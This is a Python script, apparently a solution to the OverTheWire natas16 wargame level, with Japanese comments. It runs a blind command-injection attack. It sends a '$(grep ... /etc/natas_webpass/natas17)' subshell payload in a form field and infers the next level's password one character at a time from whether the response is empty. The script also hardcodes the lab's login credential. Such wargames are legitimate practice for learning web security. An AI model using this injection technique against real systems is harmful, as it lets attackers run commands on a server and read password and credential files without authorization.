import requests

# 接続先URL
url = "http://natas16.natas.labs.overthewire.org/"

# Basic認証が必要な場合の指定方法（ユーザー名, パスワード）
auth = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")

# 候補文字列
cand = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
cand = sorted(cand)

# print(cand)

epoch = 0
decided = ""
while True:
    for c in cand:
        epoch += 1
        print("epoch: " + str(epoch) + ", password: " + decided+c)
        # コマンド置換で，/etc/natas_webpass/natas17に書かれているパスワードと一文字ずつ検索していく．
        # 正解したら，dictionary.txtに存在する文字列ができるようにサブシェルで返す．
        # そうでない場合，適当な文字列を返して，dictionary.txtに存在しない文字列を返し，出力を
        # preg_match('/[;|&`\'"]/',$key)
        command = f'$(grep -P -o ^{decided}\K{c} /etc/natas_webpass/natas17)'
        data = {"needle": command}
        # リクエストの実行
        response = requests.post(url, data=data, auth=auth)
        print(response.text)
        if (response.text):
            decided += c
            break

    if not (response.text):
        print("password: " + decided)
        break
